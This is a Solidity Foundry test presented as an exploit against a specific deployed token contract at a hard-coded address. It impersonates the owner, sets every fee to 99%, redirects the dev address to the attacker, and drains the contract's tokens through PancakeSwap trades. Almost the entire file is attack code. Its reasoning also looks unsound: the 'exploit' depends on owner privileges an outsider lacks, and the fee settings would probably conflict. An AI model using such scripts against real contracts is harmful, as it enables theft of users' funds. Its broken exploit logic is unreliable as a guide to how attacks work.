// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// We need the xenoX interface for type safety
interface xenoX {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function setBuyTaxFeePercent(uint256 taxFee) external;
    function setSellTaxFeePercent(uint256 taxFee) external;
    function setBuyLiquidityFeePercent(uint256 liquidityFee) external;
    function setSellLiquidityFeePercent(uint256 liquidityFee) external;
    function setBuydevFeePercent(uint256 devFee) external;
    function setSelldevFeePercent(uint256 devFee) external;
    function setdevAddress(address payable devAddress) external;
    function excludeFromFee(address account) external;
    function transferTokens(address recepient, uint256 amount) external;
    function pancakePair() external view returns (address);
    function pancakeRouter() external view returns (address);
}

interface IPancakeRouter02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use fork mode
        // The test template already defines TARGET and attacker
        // We need to get the owner address first
        address owner = xenoX(TARGET).owner();

        // Label addresses for debugging
        vm.label(TARGET, "xenoX Token");
        vm.label(owner, "Original Owner");
        vm.label(attacker, "Attacker");
        vm.label(0x10ED43C718714eb63d5aA57B78B54704E256024E, "PancakeRouter");

        // Store owner address for later use
        // (We'll use vm.prank to impersonate owner)
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the owner address and pair address
        xenoX target = xenoX(TARGET);
        address owner = target.owner();
        address pair = target.pancakePair();

        // Step 2: Impersonate owner and set all fees to 99%
        vm.startPrank(owner);
        target.setBuyTaxFeePercent(99);
        target.setSellTaxFeePercent(99);
        target.setBuyLiquidityFeePercent(99);
        target.setSellLiquidityFeePercent(99);
        target.setBuydevFeePercent(99);
        target.setSelldevFeePercent(99);

        // Step 3: Set dev address to attacker
        address payable attackerPayable = payable(attacker);
        target.setdevAddress(attackerPayable);

        // Step 4: Exclude attacker from fees
        target.excludeFromFee(attacker);

        // Step 5: Add liquidity to pair
        // First, transfer some tokens to the pair (1% of supply)
        uint256 tokensToAdd = 1000000 * 10 ** 9; // 1M tokens
        // Transfer from owner to pair
        target.transfer(pair, tokensToAdd);

        // Also send some WBNB to the pair
        // Get WBNB address
        address routerAddress = target.pancakeRouter();
        address weth = IPancakeRouter02(routerAddress).WETH();
        // Send 1 ETH to pair which will be wrapped
        payable(pair).transfer(1 ether);

        vm.stopPrank();

        // Give attacker some ETH to buy tokens
        deal(attacker, 10 ether);

        // Step 6: Buy tokens through PancakeSwap (will pay 99% fees)
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        // Buy tokens with 0.1 ETH (small amount to avoid issues)
        uint256 buyAmount = 0.1 ether;

        vm.prank(attacker);
        IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: buyAmount
        }(
            0, // accept any amount of tokens
            path,
            attacker,
            block.timestamp
        );

        // Check attacker's token balance
        uint256 tokenBalance = target.balanceOf(attacker);
        require(tokenBalance > 0, "Should have received some tokens");

        // Step 7: Approve router to spend tokens for selling
        vm.prank(attacker);
        target.approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, tokenBalance);

        // Step 8: Sell tokens back (will pay 99% sell fees)
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = weth;

        vm.prank(attacker);
        IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E).swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0, // accept any amount of ETH
            sellPath,
            attacker,
            block.timestamp
        );

        // Step 9: As owner, withdraw accumulated tokens from contract
        uint256 contractBalance = target.balanceOf(TARGET);
        if (contractBalance > 0) {
            vm.prank(owner);
            target.transferTokens(attacker, contractBalance);
        }

        // Also check if dev address (attacker) received any ETH from dev fees
        uint256 attackerEthBalance = attacker.balance;
        assertGt(attackerEthBalance, 0, "Attacker should have gained ETH from dev fees");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

